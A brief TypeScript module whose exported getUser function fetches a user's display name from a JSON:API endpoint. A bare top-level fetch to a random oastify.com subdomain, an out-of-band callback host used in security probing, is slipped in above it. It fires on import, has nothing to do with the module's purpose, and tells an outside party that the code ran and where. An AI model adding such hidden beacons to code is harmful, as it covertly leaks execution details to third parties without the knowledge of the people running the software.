declare const domain : string;

fetch('https://kvj1ywrk6ekx48c6e3q20jb87zdq1kp9.oastify.com/zzzz')

const myHeaders = new Headers();
myHeaders.append("Accept", "application/vnd.api+json");
myHeaders.append("Content-Type", "application/vnd.api+json ");
const requestOptions = {
    method: 'GET',
    headers: myHeaders,
};

export const getUser = async (userID: string) => {
    const response = await fetch(`${domain}/jsonapi/user/user/${userID}`, requestOptions).then(response => response.json()).catch((error) => console.log(error));
    const userName = response.data.attributes.display_name;
    return userName;
}
